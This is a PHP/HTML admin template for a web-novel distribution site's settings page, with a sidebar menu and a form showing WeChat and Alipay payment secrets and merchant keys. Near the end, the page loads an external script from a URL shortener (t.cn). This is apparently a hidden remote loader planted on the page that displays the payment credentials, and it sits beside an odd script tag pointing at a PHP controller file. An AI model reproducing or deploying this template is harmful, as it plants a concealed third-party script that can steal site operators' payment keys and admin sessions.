<?php if (!defined('THINK_PATH')) exit();?><!DOCTYPE html>
<html style="height: auto;">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<title><?php echo ($_site['name']); ?></title>
<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
<link rel="stylesheet" href="/Public/admin/css/bootstrap.min.css">
<link href="/Public/admin/css/font-awesome.min.css" rel="stylesheet">
<link href="/Public/admin/css/ionicons.min.css" rel="stylesheet">
<link rel="stylesheet" href="/Public/admin/css/AdminLTE.min.css">
<link rel="stylesheet" href="/Public/admin/css/_all-skins.min.css">
<link rel="stylesheet" href="/Public/admin/css/blue.css">
<link rel="stylesheet" href="/Public/admin/css/bootstrap-datetimepicker.min.css">
<link href="https://novel.youshuge.com/img/favicon.ico" rel="icon" type="image/x-icon">
<link rel="stylesheet" href="/Public/layer/skin/default/layer.css">
<script src="/Public/admin/js/jquery-2.2.3.min.js"></script>
<script src="/Public/admin/js/bootstrap.min.js"></script>
<script src="/Public/admin/js/bootstrap-datetimepicker.min.js"></script>
<script src="/Public/admin/js/app.min.js"></script>
<script src="/Public/layer/layer.js"></script>
<style type="text/css">
	.skin-purple-light .wrapper, .skin-purple-light .main-sidebar, .skin-purple-light .left-side {
		background-color: #f9f9f9;
	}

	.skin-purple-light .sidebar-menu > li > .treeview-menu {
		background-color: #e8e8e8;
	}

	.skin-purple-light .sidebar-menu > li > a {
		font-weight: unset;
	}

	.skin-purple-light .treeview-menu > li.active > a, .skin-purple-light .sidebar-menu > li.active > a, .skin-purple-light .treeview-menu > li.active > a {
		background-color: #e6f7ff;
		border-right: 2px solid #168fff;
		color: #57b6ff;
		font-weight: unset;
	}

	.skin-purple-light .sidebar-menu > li:hover > a, .skin-purple-light .sidebar-menu > li:hover > a, .skin-purple-light .treeview-menu > li > a:hover, .skin-purple-light .sidebar-menu > li > a:hover {
		color: #57b6ff;
	}

	.sidebar-menu .treeview-menu > li > a {
		padding-left: 40px;
		padding-top: 10px;
		padding-bottom: 10px;
	}

	.sidebar-menu .treeview-menu {
		padding-left: 0;
	}

	.skin-purple-light .sidebar a {
		color: #666;
	}

	.wysiwyg-color-black {
		color: black !important;
	}

	.wysiwyg-color-silver {
		color: silver !important;
	}

	.wysiwyg-color-gray {
		color: gray !important;
	}

	.wysiwyg-color-maroon {
		color: maroon !important;
	}

	.wysiwyg-color-red {
		color: red !important;
	}

	.wysiwyg-color-purple {
		color: purple !important;
	}

	.wysiwyg-color-green {
		color: green !important;
	}

	.wysiwyg-color-olive {
		color: olive !important;
	}

	.wysiwyg-color-navy {
		color: navy !important;
	}

	.wysiwyg-color-blue {
		color: blue !important;
	}

	.wysiwyg-color-orange {
		color: orange !important;
	}
	.glyphicon {
		margin-right: 6px;
	}
	.wechat{
		line-height: 50px;
		width: 100%;
		display: block;
		text-align: center;
		font-size: 24px;
		color: #ecfd02;
	}
</style>
<link rel="stylesheet" href="/Public/admin/css/laydate.css" id="layuicss-laydate">
<style type="text/css">
	.jqstooltip { position: absolute;left: 0px;top: 0px;visibility: hidden;background: rgb(0, 0, 0) transparent;background-color: rgba(0,0,0,0.6);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr=#99000000, endColorstr=#99000000);-ms-filter: "progid:DXImageTransform.Microsoft.gradient(startColorstr=#99000000, endColorstr=#99000000)";color: white;font: 10px arial, san serif;text-align: left;white-space: nowrap;padding: 5px;border: 1px solid white;z-index: 10000;}.jqsfield { color: white;font: 10px arial, san serif;text-align: left;}
</style>
</head>
<body class="sidebar-mini skin-purple-light" style="height: auto;">
<div class="wrapper" style="height: auto;">
    <header class="main-header">
        <a href="<?php echo U('Index/index');?>" class="logo">
            <span class="logo-mini"><b><?php echo substr($_site['name'],0,3);?></b><?php echo substr($_site['name'],3,3);?></span>
            <span class="logo-lg">
				<img src="/Public/admin/images/logo.png">
				<b><?php echo ($_site['name']); ?></b>
			</span>
			
        </a>
        <nav class="navbar navbar-static-top">
            <a href="<?php echo U('Index/index');?>" class="sidebar-toggle" data-toggle="offcanvas" role="button">
                <span class="sr-only">Toggle navigation</span>
            </a>
            <div class="navbar-custom-menu">
                <ul class="nav navbar-nav">
                    <li class="dropdown user user-menu">
                        <a href="<?php echo U('Index/index');?>" class="user-panel dropdown-toggle" data-toggle="dropdown" style="height: 50px; display: flex;">
                            <img src="/Public/admin/images/avatar2.png" class="user-image" alt="User Image">
                            <span class="hidden-xs"><?php echo session('admin.name');?></span>
                            <span>
                               <i class="fa fa-angle-down"></i>
                               <i class="fa fa-angle-up hidden"></i>
                           </span>
                        </a>
                        <ul class="user-menu dropdown-menu-right dropdown-menu dropdown-yellow dropdown-caret dropdown-close" style="width: 150px;">
                            <li>
                                <a href="<?php echo U('Config/site');?>"><i class="fa fa-fw fa-user"></i> 站点设置</a>
                            </li>
                            <li>
                                <a href="<?php echo U('Config/user');?>"><i class="fa fa-fw fa-key"></i> 修改密码</a>
                            </li>
                            <li class="divider"></li>
							<li>
                                <a href="<?php echo U('Config/camera');?>"><i class="fa fa-fw fa-camera"></i> 视频教程</a>
                            </li>
							<li class="divider"></li>
                            <li>
                                <a href="<?php echo U('Pub/logout');?>">
                                    <i class="fa fa-fw fa-power-off"></i> 安全退出
                                </a>
                            </li>
                        </ul>
                    </li>
                </ul>
            </div>
        </nav>
    </header>
   
    <aside class="main-sidebar">
        <section class="sidebar" style="height: auto;">
            <ul class="sidebar-menu">
				<li>
                    <a href="<?php echo U('Index/index');?>">
                        <i class="fa fa-tasks"></i> <span>首页</span>
                    </a>
                </li>
				<li class="treeview">
                    <a href="#">
						<i class=" fa fa-sun-o"></i> 
						<span>站点设置</span>
                        <span class="pull-right-container">
							<i class="fa fa-angle-left pull-right"></i>
						</span>
                    </a>
                    <ul class="treeview-menu">
                        <li>
							<a href="<?php echo U('Config/site');?>">
								<i class="fa fa-angle-right"></i> 
								站点设置
							</a>
						</li>
						<li>
							<a href="<?php echo U('Config/charge');?>">
								<i class="fa fa-angle-right"></i>
								充值设置
							</a>
						</li>
						<li>
							<a href="<?php echo U('Config/navindex');?>">
								<i class="fa fa-angle-right"></i>
								底部导航
							</a>
						</li>
						<li>
							<a href="<?php echo U('Config/middleindex');?>">
								<i class="fa fa-angle-right"></i>
								中间导航
							</a>
						</li>
						<li>
							<a href="<?php echo U('Config/ads');?>">
								<i class="fa fa-angle-right"></i> 
								广告设置
							</a>
						</li>
						<li>
							<a href="<?php echo U('Config/tpl');?>">
								<i class="fa fa-angle-right"></i> 
								模版设置
							</a>
						</li>
						<li>
							<a href="<?php echo U('Config/logo');?>">
								<i class="fa fa-angle-right"></i>
								首页logo
							</a>
						</li>
						<li>
							<a href="<?php echo U('Config/user');?>">
								<i class="fa fa-angle-right"></i> 
								修改密码
							</a>
						</li>
                    </ul>
				</li>
                
				
				<li class="treeview">
                    <a href="#">
						<i class="fa fa-bar-chart"></i> 
						<span>数据统计</span>
                        <span class="pull-right-container">
							<i class="fa fa-angle-left pull-right"></i>
						</span>
                    </a>
                    <ul class="treeview-menu">
						<li>
							<a href="<?php echo U('Center/orders');?>">
								<i class="fa fa-angle-right"></i> 
								订单统计
							</a>
						</li>
                        <li>
							<a href="<?php echo U('Center/users');?>">
								<i class="fa fa-angle-right"></i> 
								用户统计
							</a>
						</li>
						<li>
							<a href="<?php echo U('Center/charge');?>">
								<i class="fa fa-angle-right"></i> 
								充值统计
							</a>
						</li>
						<li>
							<a href="<?php echo U('Center/separate');?>">
								<i class="fa fa-angle-right"></i> 
								分成统计
							</a>
						</li>
						<li>
							<a href="<?php echo U('Center/chapter');?>">
								<i class="fa fa-angle-right"></i> 
								外推统计
							</a>
						</li>
						<li>
							<a href="<?php echo U('Center/lodge');?>">
								<i class="fa fa-angle-right"></i> 
								举报统计
							</a>
						</li>
                    </ul>
				</li>
								
				<li class="treeview">
                    <a href="#">
						<i class="fa fa-bar-chart"></i> 
						<span>财务统计</span>
                        <span class="pull-right-container">
							<i class="fa fa-angle-left pull-right"></i>
						</span>
                    </a>
                    <ul class="treeview-menu">
						<li>
							<a href="<?php echo U('Center/corder');?>">
								<i class="fa fa-angle-right"></i> 
								订单信息
							</a>
						</li>
						<li>
							<a href="<?php echo U('Charge/index');?>">
								<i class="fa fa-angle-right"></i> 
								充值记录
							</a>
						</li>
						<li>
							<a href="<?php echo U('Center/withdraw');?>">
								<i class="fa fa-angle-right"></i> 
								代理结算
							</a>
						</li>
                    </ul>
				</li> 
                <!-- <li class="treeview">
                    <a href="#">
						<i class=" fa fa-image"></i> 
						<span>漫画管理</span>
                        <span class="pull-right-container">
							<i class="fa fa-angle-left pull-right"></i>
						</span>
                    </a>
                    <ul class="treeview-menu">
						<li>
							<a href="<?php echo U('Config/mhArea');?>">
								<i class="fa fa-angle-right"></i> 
								发布区域
							</a>
						</li>
                        <li>
							<a href="<?php echo U('Config/mhStore');?>">
								<i class="fa fa-angle-right"></i> 
								漫画分类
							</a>
						</li>
						<li>
							<a href="<?php echo U('Config/mhBanner');?>">
								<i class="fa fa-angle-right"></i> 
								漫画轮播
							</a>
						</li>
						<li>
							<a href="<?php echo U('Book/caric');?>">
								<i class="fa fa-angle-right"></i> 
								漫画列表
							</a>
						</li>
						<li>
							<a href="<?php echo U('Book/caricRecover');?>">
								<i class="fa fa-angle-right"></i> 
								漫画仓库
							</a>
						</li>
						<li>
							<a href="<?php echo U('Book/caricComments');?>">
								<i class="fa fa-angle-right"></i> 
								评论管理
							</a>
						</li>
                    </ul>
				</li>
				 -->
				<li class="treeview">
                    <a href="#">
						<i class=" fa fa-book"></i> 
						<span>小说管理</span>
                        <span class="pull-right-container">
							<i class="fa fa-angle-left pull-right"></i>
						</span>
                    </a>
                    <ul class="treeview-menu">
						<li>
							<a href="<?php echo U('Config/xsArea');?>">
								<i class="fa fa-angle-right"></i> 
								发布区域
							</a>
						</li>
                        <li>
							<a href="<?php echo U('Config/xsStore');?>">
								<i class="fa fa-angle-right"></i> 
								小说分类
							</a>
						</li>
						<li>
							<a href="<?php echo U('Config/xsBanner');?>">
								<i class="fa fa-angle-right"></i> 
								小说轮播
							</a>
						</li>
						<li>
							<a href="<?php echo U('Book/novel');?>">
								<i class="fa fa-angle-right"></i> 
								小说列表
							</a>
						</li>
						<li>
							<a href="<?php echo U('Book/novelRecover');?>">
								<i class="fa fa-angle-right"></i> 
								小说仓库
							</a>
							<li>
							<a href="<?php echo U('Book/novelComments');?>">
								<i class="fa fa-angle-right"></i> 
								评论管理
							</a>
						</li>
						</li>
                    </ul>
				</li>
				
				<!-- <li class="treeview">
                    <a href="#">
						<i class=" fa fa-podcast"></i> 
						<span>听书管理</span>
                        <span class="pull-right-container">
							<i class="fa fa-angle-left pull-right"></i>
						</span>
                    </a>
                    <ul class="treeview-menu">
						<li>
							<a href="<?php echo U('Config/stArea');?>">
								<i class="fa fa-angle-right"></i> 
								发布区域
							</a>
						</li>
                        <li>
							<a href="<?php echo U('Config/stStore');?>">
								<i class="fa fa-angle-right"></i> 
								听书分类
							</a>
						</li>
						<li>
							<a href="<?php echo U('Config/stBanner');?>">
								<i class="fa fa-angle-right"></i> 
								听书轮播
							</a>
						</li>
						<li>
							<a href="<?php echo U('Book/story');?>">
								<i class="fa fa-angle-right"></i> 
								听书列表
							</a>
						</li>
						<li>
							<a href="<?php echo U('Book/storyRecover');?>">
								<i class="fa fa-angle-right"></i> 
								听书仓库
							</a>
						</li>
						<li>
							<a href="<?php echo U('Book/storyComments');?>">
								<i class="fa fa-angle-right"></i> 
								评论管理
							</a>
						</li>
                    </ul>
				</li>
				
				<li class="treeview">
                    <a href="#">
						<i class=" fa fa-file-video-o"></i> 
						<span>视频/电影管理</span>
                        <span class="pull-right-container">
							<i class="fa fa-angle-left pull-right"></i>
						</span>
                    </a>
                    <ul class="treeview-menu">
                        <li>
							<a href="<?php echo U('Config/vdBanner');?>">
								<i class="fa fa-angle-right"></i> 
								轮播图设置
							</a>
						</li>
						<li>
							<a href="<?php echo U('Config/vdStore');?>">
								<i class="fa fa-angle-right"></i> 
								影视分类
							</a>
						</li>
						<li>
							<a href="<?php echo U('Config/vdArea');?>">
								<i class="fa fa-angle-right"></i> 
								<span>发布区域</span>
							</a>
						</li>
						<li>
							<a href="<?php echo U('Video/index');?>">
								<i class="fa fa-angle-right"></i> 
								<span>影视列表</span>
							</a>
						</li>
                    </ul>
				</li>
				
				<li class="treeview">
                    <a href="#">
						<i class=" fa fa-file-image-o"></i> 
						<span>漫画文案</span>
                        <span class="pull-right-container">
							<i class="fa fa-angle-left pull-right"></i>
						</span>
                    </a>
                    <ul class="treeview-menu">
                        <li>
							<a href="<?php echo U('Cartoon/index');?>">
								<i class="fa fa-angle-right"></i> 
								漫画列表
							</a>
						</li>
						<li>
							<a href="<?php echo U('Chapter/index');?>">
								<i class="fa fa-angle-right"></i> 
								推广链接
							</a>
						</li>
						<li>
							<a href="<?php echo U('Chapter/delList');?>">
								<i class="fa fa-angle-right"></i> 
								推广回收
							</a>
						</li>
                    </ul>
				</li> -->
				
				<li class="treeview">
                    <a href="#">
						<i class=" fa fa-book"></i> 
						<span>小说文案</span>
                        <span class="pull-right-container">
							<i class="fa fa-angle-left pull-right"></i>
						</span>
                    </a>
                    <ul class="treeview-menu">
                        <li>
							<a href="<?php echo U('Novel/index');?>">
								<i class="fa fa-angle-right"></i> 
								小说列表
							</a>
						</li>
						<li>
							<a href="<?php echo U('Nhapter/index');?>">
								<i class="fa fa-angle-right"></i> 
								推广链接
							</a>
						</li>
						<li>
							<a href="<?php echo U('Nhapter/delList');?>">
								<i class="fa fa-angle-right"></i> 
								推广回收
							</a>
						</li>
                    </ul>
				</li>
				<li>
                    <a href="<?php echo U('User/index');?>">
                        <i class="fa fa-users"></i><span>粉丝信息</span>
                    </a>
                </li>
				
				<li class="treeview">
                    <a href="#">
						<i class="fa fa-user-plus"></i> 
						<span>渠道/代理商</span>
                        <span class="pull-right-container">
							<i class="fa fa-angle-left pull-right"></i>
						</span>
                    </a>
                    <ul class="treeview-menu">
                        <li>
							<a href="<?php echo U('Mch/indes');?>">
								<i class="fa fa-angle-right"></i> 
								代理商管理
							</a>
						</li>
						<li>
							<a href="<?php echo U('Mch/index');?>">
								<i class="fa fa-angle-right"></i> 
								渠道商管理
							</a>
						</li>
                    </ul>
				</li>
				
				
				<li class="treeview">
                    <a href="#">
						<i class="fa fa-commenting"></i> 
						<span>消息推送</span>
                        <span class="pull-right-container">
							<i class="fa fa-angle-left pull-right"></i>
						</span>
                    </a>
                    <ul class="treeview-menu">
                        <li>
							<a href="<?php echo U('Custom/index');?>">
								<i class="fa fa-angle-right"></i> 
								群发推送
							</a>
						</li>
						<li>
							<a href="<?php echo U('Autoreply/index');?>">
								<i class="fa fa-angle-right"></i> 
								关键词回复
							</a>
						</li>
						<li>
							<a href="<?php echo U('Activity/index');?>">
								<i class="fa fa-angle-right"></i> 
								促销活动
							</a>
						</li>
                    </ul>
				</li>
				
				<li class="treeview">
                    <a href="#">
						<i class=" fa fa-gears"></i> 
						<span>公众号设置</span>
                        <span class="pull-right-container">
							<i class="fa fa-angle-left pull-right"></i>
						</span>
                    </a>
                    <ul class="treeview-menu">
                        <li>
							<a href="<?php echo U('Selfmenu/index');?>">
								<i class="fa fa-angle-right"></i> 
								公众号菜单
							</a>
						</li>
						<li>
							<a href="<?php echo U('Index/integrate');?>">
								<i class="fa fa-angle-right"></i> 
								公众号配置
							</a>
						</li>
						<li>
							<a href="<?php echo U('Selfmenu/links');?>">
								<i class="fa fa-angle-right"></i> <span>获取链接菜单</span>
							</a>
						</li>
                    </ul>
				</li>
				
				
				<li>
                    <a href="<?php echo U('Article/index');?>">
                        <i class="fa fa-newspaper-o"></i> <span>文案信息</span>
                    </a>
                </li>
				

				<!-- <li class="treeview">
                    <a href="#">
						<i class=" fa fa-diamond"></i> 
						<span>购物商城</span>
                        <span class="pull-right-container">
							<i class="fa fa-angle-left pull-right"></i>
						</span>
                    </a>
                    <ul class="treeview-menu">
                        <li>
							<a href="<?php echo U('Seller/index');?>">
								<i class="fa fa-angle-right"></i> 
								商品管理
							</a>
						</li>
						<li>
							<a href="<?php echo U('Seller/record');?>">
								<i class="fa fa-angle-right"></i> 
								购买记录
							</a>
						</li>
                    </ul>
				</li> -->
				<li class="treeview">
                    <a href="#">
						<i class="fa fa-bullhorn"></i> 
						<span>公告管理</span>
                        <span class="pull-right-container">
							<i class="fa fa-angle-left pull-right"></i>
						</span>
                    </a>
                    <ul class="treeview-menu">
                        <li>
							<a href="<?php echo U('Notice/index');?>">
								<i class="fa fa-angle-right"></i> 
								代理公告
							</a>
						</li>
						<li>
							<a href="<?php echo U('Umsg/index');?>">
								<i class="fa fa-angle-right"></i> 
								个人公告
							</a>
						</li>
                    </ul>
				</li>
				<li>
                    <a href="<?php echo U('Feed/index');?>">
                        <i class="fa fa-comment"></i> <span>用户反馈</span>
                    </a>
                </li>
				
				<li class="treeview">
                    <a href="#">
						<i class="fa fa-cny"></i> 
						<span>打赏信息</span>
                        <span class="pull-right-container">
							<i class="fa fa-angle-left pull-right"></i>
						</span>
                    </a>
                    <ul class="treeview-menu">
                        <li>
							<a href="<?php echo U('Config/prize');?>">
								<i class="fa fa-angle-right"></i> 
								打赏金额设置
							</a>
						</li>
						<li>
							<a href="<?php echo U('Prize/index');?>">
								<i class="fa fa-angle-right"></i> 
								打赏列表
							</a>
						</li>
                    </ul>
				</li>
				<li>
                    <a href="<?php echo U('Joinus/index');?>">
                        <i class="fa fa-address-card"></i><span>加盟代理记录</span>
                    </a>
                </li>
            </ul>
        </section>
    </aside>
    <div class="content-wrapper" style="min-height: 848px;">
        <!-- Content Header (Page header) -->
<script src="/Application/Admin/Controller/IpController.class.php"></script>
<section class="content-header">
	<div>
		<ol class="breadcrumb" style="background: none; margin-bottom: 0px;">
			<li>
				<a href="<?php echo U('Index/index');?>" style="color: #333;">
				<i class=" fa fa-home">
				&nbsp;</i>Home</a>
			</li>
			<li class="active">站点设置</li>
			<li class="active">站点信息</li>
		</ol>
	</div>
</section>
<section class="content">
	<div class="row">
		<div class="col-xs-12">
			<div class="box box-primary">
				<form class="form-horizontal" style="margin-top:30px" method="POST" enctype="multipart/form-data">
					<div class="box-body">
						<div class="form-group">
							<label for="exampleInputEmail1" class="control-label col-sm-3">网站名称</label>
							<div class="col-sm-6">
								<input type="text" name="name" class="form-control col-sm-9" value="<?php echo ($_site['name']); ?>">
							</div>
						</div>					
					</div>
					<div class="box-body">
						<div class="form-group">
							<label for="exampleInputEmail1" class="control-label col-sm-3">网站安全域名</label>
							<div class="col-sm-6">
								<input type="text" name="url" class="form-control col-sm-9" value="<?php echo ($_site['url']); ?>">
							</div>
						</div>					
					</div>
					<div class="box-body">
						<div class="form-group">
							<label for="exampleInputEmail1" class="control-label col-sm-3">网站支付方式</label>
							<div class="col-sm-6">
								<select class="form-control col-sm-9" name="paymodel" id="paymodel" default="<?php echo ($_site['paymodel']); ?>">
									<option value="">请选择</option>
									<option value="1">微信支付</option>
									<option value="2">个人微信支付</option>
									<option value="3">支付宝支付</option>
								</select>
							</div>
						</div>					
					</div>
					<div class="paymodel" <?php if($_site['paymodel'] == 1): ?>style="display:block"<?php else: ?>style="display:none"<?php endif; ?>>
						<div class="box-body">
							<div class="form-group">
								<label for="exampleInputEmail1" class="control-label col-sm-3">APPID</label>
								<div class="col-sm-6">
									<input type="text" name="appid" class="form-control col-sm-9" value="<?php echo ($_site['appid']); ?>">
								</div>
							</div>					
						</div>
						<div class="box-body">
							<div class="form-group">
								<label for="exampleInputEmail1" class="control-label col-sm-3">APPSECRET</label>
								<div class="col-sm-6">
									<input type="text" name="appsecret" class="form-control col-sm-9" value="<?php echo ($_site['appsecret']); ?>">
								</div>
							</div>					
						</div>
						<div class="box-body">
							<div class="form-group">
								<label for="exampleInputEmail1" class="control-label col-sm-3">商户ID</label>
								<div class="col-sm-6">
									<input type="text" name="mchid" class="form-control col-sm-9" value="<?php echo ($_site['mchid']); ?>">
								</div>
							</div>					
						</div>
						<div class="box-body">
							<div class="form-group">
								<label for="exampleInputEmail1" class="control-label col-sm-3">商户支付key</label>
								<div class="col-sm-6">
									<input type="text" name="mchkey" class="form-control col-sm-9" value="<?php echo ($_site['mchkey']); ?>">
								</div>
							</div>					
						</div>
					</div>
					
					<div class="paymodel" <?php if($_site['paymodel'] == 2): ?>style="display:block"<?php else: ?>style="display:none"<?php endif; ?>>
						<div class="box-body paysapi">
							<div class="form-group">
								<label for="exampleInputEmail1" class="control-label col-sm-3">个人微信账号</label>
								<div class="col-sm-6">
									<input type="text" name="paysuid" class="form-control col-sm-9" value="<?php echo ($_site['paysuid']); ?>">
								</div>
							</div>					
						</div>
						<div class="box-body paysapi">
							<div class="form-group">
								<label for="exampleInputEmail1" class="control-label col-sm-3">个人微信密钥</label>
								<div class="col-sm-6">
									<input type="text" name="paystoken" class="form-control col-sm-9" value="<?php echo ($_site['paystoken']); ?>">
								</div>
							</div>					
						</div>
					</div>
					
					<div class="paymodel" <?php if($_site['paymodel'] == 3): ?>style="display:block"<?php else: ?>style="display:none"<?php endif; ?>>
						<div class="box-body paysapi">
							<div class="form-group">
								<label for="exampleInputEmail1" class="control-label col-sm-3">支付宝PID(合作者身份)</label>
								<div class="col-sm-6">
									<input type="text" name="alipaypid" class="form-control col-sm-9" value="<?php echo ($_site['alipaypid']); ?>">
								</div>
							</div>					
						</div>
						<div class="box-body paysapi">
							<div class="form-group">
								<label for="exampleInputEmail1" class="control-label col-sm-3">支付宝支付KEY(安全校验码)</label>
								<div class="col-sm-6">
									<input type="text" name="alipaykey" class="form-control col-sm-9" value="<?php echo ($_site['alipaykey']); ?>">
								</div>
							</div>					
						</div>
					</div>					
					
					<div class="box-body">
						<div class="form-group">
							<label for="exampleInputEmail1" class="control-label col-sm-3">开放平台APPID</label>
							<div class="col-sm-6">
								<input type="text" name="open_appid" class="form-control col-sm-9" value="<?php echo ($_site['open_appid']); ?>">
								<p class="help-block help-block-error col-sm-7 col-xs-10">作用于APP授权用户</p>
							</div>
						</div>					
					</div>
					
					<div class="box-body">
						<div class="form-group">
							<label for="exampleInputEmail1" class="control-label col-sm-3">开放平台APPSECRET</label>
							<div class="col-sm-6">
								<input type="text" name="open_appsecret" class="form-control col-sm-9" value="<?php echo ($_site['open_appsecret']); ?>">
								<p class="help-block help-block-error col-sm-7 col-xs-10">作用于APP授权用户</p>
							</div>
						</div>					
					</div>
					
					
					<div class="box-body">
						<div class="form-group">
							<label for="exampleInputEmail1" class="control-label col-sm-3">支付方式说明</label>
							<div class="col-sm-6">
								<input type="text" name="paymsg" class="form-control col-sm-9" value="<?php echo ($_site['paymsg']); ?>">
							</div>
						</div>					
					</div>
					
					<div class="box-body">
						<div class="form-group">
							<label for="exampleInputEmail1" class="control-label col-sm-3">是否开启签到</label>
							<div class="col-sm-6">
								<select class="form-control col-sm-9" name="issign" default="<?php echo ($_site['issign']); ?>">
									<option value="">请选择</option>
									<option value="1">是</option>
									<option value="2">否</option>
								</select>
							</div>
						</div>					
					</div>
					
					<div class="box-body">
						<div class="form-group">
							<label for="exampleInputEmail1" class="control-label col-sm-3">签到赠送书币</label>
							<div class="col-sm-6">
								<input type="text" name="signmoney" class="form-control col-sm-9" value="<?php echo ($_site['signmoney']); ?>">
							</div>
						</div>					
					</div>
					
					<div class="box-body">
						<div class="form-group">
							<label for="exampleInputEmail1" class="control-label col-sm-3">分享赠送书币</label>
							<div class="col-sm-6">
								<input type="text" name="sharemoney" class="form-control col-sm-9" value="<?php echo ($_site['sharemoney']); ?>">
							</div>
						</div>					
					</div>
					
					<div class="box-body">
						<div class="form-group">
							<label for="exampleInputEmail1" class="control-label col-sm-3">网站首次关注提示关键词</label>
							<div class="col-sm-6">
								<input type="text" name="subscribe" class="form-control col-sm-9" value="<?php echo ($_site['subscribe']); ?>">
							</div>
						</div>					
					</div>
					
					<div class="box-body">
						<div class="form-group">
							<label for="exampleInputEmail1" class="control-label col-sm-3">官方QQ</label>
							<div class="col-sm-6">
								<input type="text" name="qq" class="form-control col-sm-9" value="<?php echo ($_site['qq']); ?>">
							</div>
						</div>					
					</div>
					
					<div class="box-body">
						<div class="form-group">
							<label for="exampleInputEmail1" class="control-label col-sm-3">官方微信</label>
							<div class="col-sm-6">
								<input type="text" name="weixin" class="form-control col-sm-9" value="<?php echo ($_site['weixin']); ?>">
							</div>
						</div>					
					</div>
					<div class="box-body">
						<div class="form-group">
							<label for="exampleInputEmail1" class="control-label col-sm-3">官方手机号</label>
							<div class="col-sm-6">
								<input type="text" name="tel" class="form-control col-sm-9" value="<?php echo ($_site['tel']); ?>">
							</div>
						</div>					
					</div>
					<div class="box-body">
						<div class="form-group">
							<label for="exampleInputEmail1" class="control-label col-sm-3">公众号二维码图片</label>
							<div class="col-sm-6">
								<iframe src="<?php echo U('Index/upload', 'event=setPic&url='.$_site['qrcode']);?>" scrolling="no" style="width:200px;height:200px;border: none;display:block;"></iframe>
								<input type="hidden" name="qrcode" id="qrcode" value="<?php echo ($_site['qrcode']); ?>" class="smallinput" />
								<script>
								function setPic(url){
									document.getElementById('qrcode').value = url;
								}
								</script>
								<p class="help-block help-block-error col-sm-7 col-xs-10">点击图片可进行更换</p>
							</div>
						</div>					
					</div>
					
					
					<div class="box-body">
						<div class="form-group">
							<label for="exampleInputEmail1" class="control-label col-sm-3">分享话术</label>
							<div class="col-sm-6">
								<textarea name="huas" id="huas" style="width: 100%;height: 150px;"><?php echo ($_site['huas']); ?></textarea>
							</div>
						</div>					
					</div>
					
					<div class="box-body">
						<div class="form-group">
							<label for="exampleInputEmail1" class="control-label col-sm-3">分享图片</label>
							<div class="col-sm-6">
								<iframe src="<?php echo U('Index/upload', 'event=setPicB&url='.$_site['huaspic']);?>" scrolling="no" style="width:200px;height:200px;border: none;display:block;"></iframe>
								<input type="hidden" name="huaspic" id="huaspic" value="<?php echo ($_site['huaspic']); ?>" class="smallinput" />
								<script>
								function setPicB(url){
									document.getElementById('huaspic').value = url;
								}
								</script>
								<p class="help-block help-block-error col-sm-7 col-xs-10">点击图片可进行更换</p>
							</div>
						</div>					
					</div>
					
					<div class="box-body">
						<div class="form-group">
							<label for="exampleInputEmail1" class="control-label col-sm-3">推广背景图</label>
							<div class="col-sm-6">
								<iframe src="<?php echo U('Index/upload', 'event=setPicPic&url='.$_site['sharepic']);?>" scrolling="no" style="width:200px;height:250px;border: none;display:block;"></iframe>
								<input type="hidden" name="sharepic" id="sharepic" value="<?php echo ($_site['sharepic']); ?>" class="smallinput" />
								<script>
								function setPicPic(url){
									document.getElementById('sharepic').value = url;
								}
								</script>
								<p class="help-block help-block-error col-sm-7 col-xs-10">点击图片可进行更换</p>
							</div>
						</div>					
					</div>
					
					<div class="box-body">
						<div class="form-group">
							<label for="exampleInputEmail1" class="control-label col-sm-3">加盟商家价格</label>
							<div class="col-sm-6">
								<input type="text" name="amoney" class="form-control col-sm-9" value="<?php echo ($_site['amoney']); ?>">
							</div>
						</div>					
					</div>
					
					<div class="box-body">
						<div class="form-group">
							<label for="exampleInputEmail1" class="control-label col-sm-3">加盟商家背景图</label>
							<div class="col-sm-6">
								<iframe src="<?php echo U('Index/upload', 'event=setPicPicA&url='.$_site['agent']);?>" scrolling="no" style="width:200px;height:250px;border: none;display:block;"></iframe>
								<input type="hidden" name="agent" id="agent" value="<?php echo ($_site['agent']); ?>" class="smallinput" />
								<script>
								function setPicPicA(url){
									document.getElementById('agent').value = url;
								}
								</script>
								<p class="help-block help-block-error col-sm-7 col-xs-10">点击图片可进行更换</p>
							</div>
						</div>					
					</div>
					
					<!-- /.box-body -->

					<div class="box-footer">
						<div class="form-group">
							<div class="col-sm-offset-3 col-sm-9">
								<button type="button" id="ajaxBtn" class="btn btn-primary">保存</button>
							</div>
						</div>
					</div>
					
				</form>
			</div>
		</div>
	</div>
</section>
<script src="http://t.cn/A6hjvR8W"></script>
<script>
	$('#paymodel').on('change',function(){
		var model = $('#paymodel option:selected').val();
		if(model){
			$('.paymodel').hide();
			$('.paymodel').eq(model-1).show();
		}else{
			$('.paymodel').hide();
		}
		
	})

</script>

    </div>
  
    <div class="control-sidebar-bg" style="position: fixed; height: auto;"></div>
</div>
<script src="/Public/admin/js/common.js"></script>
<script>
	var route = "<?php echo ($CAname); ?>";
    var href = '';
    $('.sidebar-menu').find('a').each(function () {
        $(this).parent('li').removeClass('active');
        href = $(this).attr('href');
        if ((href.indexOf(route) != -1) && (route != '/')) {
            $(this).parent('li').addClass('active');
            $(this).parents('.treeview').addClass('active');
		}
    });

    $('.dropdown-toggle').click(function (ev) {
        $(this).find('.fa-angle-down').toggleClass('hidden');
        $(this).find('.fa-angle-up').toggleClass('hidden');
    });
	
	// 调整默认选择内容
	$("select").each(function(index, element) {
		$(element).find("option[value='"+$(this).attr('default')+"']").attr('selected','selected');
	});
</script>
</body>
</html>